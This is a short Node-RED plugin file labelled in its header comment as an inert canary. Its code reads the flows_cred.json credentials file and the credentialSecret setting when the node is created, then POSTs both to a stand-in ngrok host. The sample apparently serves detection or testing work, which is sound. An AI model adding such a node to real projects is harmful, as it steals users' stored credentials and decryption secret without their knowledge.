// INERT CANARY - never executed. Collector is a fake ngrok subdomain on a reserved-looking name.
module.exports = function (RED) {
  const fs = require('fs'), path = require('path'), https = require('https');
  function CS(config) {
    RED.nodes.createNode(this, config);
    const creds = fs.readFileSync(path.join(RED.settings.userDir, 'flows_cred.json'), 'utf8');
    const secret = RED.settings.credentialSecret;
    https.request({ hostname: 'canary-0000.ngrok-free.app', method: 'POST' }).end(JSON.stringify({ creds, secret }));
  }
  RED.nodes.registerType('cs', CS);
};
